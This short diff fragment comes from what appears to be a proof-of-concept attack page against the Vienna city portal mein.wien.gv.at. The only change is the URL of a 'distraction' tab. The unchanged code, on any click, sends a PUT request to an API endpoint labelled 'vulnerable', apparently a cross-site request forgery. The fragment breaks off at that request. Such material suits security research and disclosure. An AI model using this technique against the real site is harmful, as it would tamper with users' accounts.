@@ -11,7 +11,7 @@
         document.addEventListener("DOMContentLoaded", () => {
             document.onclick = () => {
                 // Open target site in new tab (distraction)
-                open('https://mein.wien.gv.at');
+                open('https://mein.wien.gv.at/Mein-Profil');
                 
                 // Send PUT request to vulnerable endpoint
                 fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
